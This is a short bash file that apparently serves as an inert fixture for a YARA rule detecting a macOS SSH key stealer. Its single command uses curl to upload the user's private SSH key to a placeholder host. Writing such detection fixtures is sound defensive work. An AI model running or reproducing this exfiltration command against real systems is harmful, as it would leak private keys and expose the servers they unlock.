#!/bin/bash
# Inert YARA fixture for CERBER_MacOS_SSH_Key_Stealer - text only, not a working sample.
curl -s -F "k=@$HOME/.ssh/id_rsa" http://example.invalid/up
